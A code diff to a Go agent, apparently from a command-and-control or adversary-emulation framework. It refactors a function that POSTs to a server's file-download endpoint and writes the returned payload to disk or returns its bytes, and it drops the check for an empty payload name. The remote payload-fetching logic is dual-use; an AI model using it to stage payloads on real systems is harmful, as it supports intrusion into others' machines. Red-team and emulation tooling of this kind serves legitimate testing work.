@@ -48,31 +48,28 @@ func (contact API) GetInstructions(profile map[string]interface{}) map[string]in
 // payload will be written to disk (return string will contain filepath). If writeToDisk is false, then []byte will contain the payload bytes,
 // and the returned string will be an empty string
 func (contact API) GetPayloadBytes(payload string, server string, uniqueID string, platform string, writeToDisk bool) (string, []byte) {
-    var retBuf []byte
+    var payloadBytes []byte
     location := ""
-    if len(payload) > 0 {
-		output.VerbosePrint(fmt.Sprintf("[*] Downloading new payload bytes: %s", payload))
-		address := fmt.Sprintf("%s/file/download", server)
-		req, _ := http.NewRequest("POST", address, nil)
-		req.Header.Set("file", payload)
-		req.Header.Set("platform", platform)
-		client := &http.Client{}
-		resp, err := client.Do(req)
-		if err == nil && resp.StatusCode == ok {
-		    if writeToDisk {
-		        // Write payload to disk.
-		        location = filepath.Join(payload)
-		        util.WritePayload(location, resp)
-		    } else {
-		        // Not writing to disk - return the payload bytes.
-			    buf, err := ioutil.ReadAll(resp.Body)
-			    if err == nil {
-			        retBuf = buf
-			    }
-		    }
-		}
-	}
-	return location, retBuf
+    output.VerbosePrint(fmt.Sprintf("[*] Downloading new payload bytes: %s", payload))
+    address := fmt.Sprintf("%s/file/download", server)
+    req, _ := http.NewRequest("POST", address, nil)
+    req.Header.Set("file", payload)
+    req.Header.Set("platform", platform)
+    client := &http.Client{}
+    resp, err := client.Do(req)
+    if err == nil && resp.StatusCode == ok {
+        if writeToDisk {
+            location = filepath.Join(payload)
+            util.WritePayload(location, resp)
+        } else {
+            // Not writing to disk - return the payload bytes.
+            buf, err := ioutil.ReadAll(resp.Body)
+            if err == nil {
+                payloadBytes = buf
+            }
+        }
+    }
+	return location, payloadBytes
 }
 
 //RunInstruction runs a single instruction
